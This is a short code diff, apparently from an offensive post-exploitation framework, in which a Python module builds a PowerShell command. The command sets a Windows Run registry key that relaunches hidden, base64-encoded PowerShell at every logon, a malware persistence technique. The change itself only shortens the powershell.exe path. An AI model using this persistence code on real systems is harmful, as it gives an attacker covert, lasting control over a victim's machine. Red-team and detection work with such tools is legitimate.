@@ -187,7 +187,7 @@ class Module:
         script += (
             "$null=Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name "
             + key_name
-            + ' -Value \'"C:\\Windows\\System32\\cmd.exe" /c start /min "" "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -c "$x='
+            + ' -Value \'"C:\\Windows\\System32\\cmd.exe" /c start /min "" "powershell.exe" -c "$x='
             + location_string
             + ";powershell -Win Hidden -enc $x\"';"
         )
